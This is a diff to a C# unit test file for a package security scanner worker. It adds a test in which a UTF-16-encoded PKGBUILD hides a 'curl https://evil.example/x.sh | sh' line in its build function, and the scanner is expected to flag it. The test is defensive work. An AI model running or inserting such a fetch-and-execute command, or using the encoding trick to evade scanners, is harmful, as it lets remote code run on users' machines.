@@ -1,3 +1,4 @@
+using System.Text;
 using Atoll.Api.Services.Security;
 using Atoll.Api.Tests.Support;
 using Atoll.Api.Services.Security.Persistence;
@@ -29,7 +30,7 @@ public class PackageSecurityWorkerTests
     private static PackageRevisionContentDocument RevisionContent(
         string name,
         string revisionId,
-        string content)
+        IReadOnlyDictionary<string, byte[]> files)
     {
         return new PackageRevisionContentDocument
         {
@@ -39,10 +40,8 @@ public class PackageSecurityWorkerTests
             CreatedAt = DateTimeOffset.UtcNow,
             Author = "test",
             Message = "seed",
-            Files = new Dictionary<string, PackageFile>(StringComparer.Ordinal)
-            {
-                ["PKGBUILD"] = PackageFileFactory.FromText(content)
-            }
+            Files = files.ToDictionary(
+                kv => kv.Key, kv => PackageFileFactory.FromBytes(kv.Value), StringComparer.Ordinal)
         };
     }
 
@@ -53,7 +52,25 @@ public class PackageSecurityWorkerTests
         string content,
         int? requiredPolicyVersion = null)
     {
-        var revision = RevisionContent(name, "rev-1", content);
+        await SeedFilesAsync(
+            repo,
+            securityRepo,
+            name,
+            new Dictionary<string, byte[]>(StringComparer.Ordinal)
+            {
+                ["PKGBUILD"] = Encoding.UTF8.GetBytes(content)
+            },
+            requiredPolicyVersion);
+    }
+
+    private static async Task SeedFilesAsync(
+        InMemoryPackageRepository repo,
+        InMemoryPackageSecurityRepository securityRepo,
+        string name,
+        IReadOnlyDictionary<string, byte[]> files,
+        int? requiredPolicyVersion = null)
+    {
+        var revision = RevisionContent(name, "rev-1", files);
         await repo.InsertSeedAsync(new PackageDocument
         {
             Id = name,
@@ -108,6 +125,33 @@ public class PackageSecurityWorkerTests
         Assert.Equal(SecurityStatus.Flagged, scan.Status);
         Assert.NotEmpty(scan.Findings);
         Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan.PolicyVersion);
+    }
+
+    [Fact]
+    public async Task StartAsync_Utf16PkgBuild_DecodedForScanningAndFlagged()
+    {
+        // The worker hands stored bytes to the scanner, whose scan-only view decodes
+        // BOM-marked UTF-16. A UTF-8-only decode would hide the curl | sh command.
+        var repo = new InMemoryPackageRepository();
+        var securityRepo = new InMemoryPackageSecurityRepository();
+        byte[] pkgBuild =
+        [
+            .. Encoding.Unicode.GetPreamble(),
+            .. Encoding.Unicode.GetBytes("pkgname=utf16\nbuild() {\n  curl https://evil.example/x.sh | sh\n}\n")
+        ];
+        await SeedFilesAsync(
+            repo,
+            securityRepo,
+            "utf16",
+            new Dictionary<string, byte[]>(StringComparer.Ordinal) { ["PKGBUILD"] = pkgBuild });
+
+        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true));
+        await worker.StartAsync(CancellationToken.None);
+        var scan = await WaitForScanAsync(securityRepo, "utf16");
+        await worker.StopAsync(CancellationToken.None);
+
+        Assert.Equal(SecurityStatus.Flagged, scan.Status);
+        Assert.Contains(scan.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
     }
 
     [Fact]
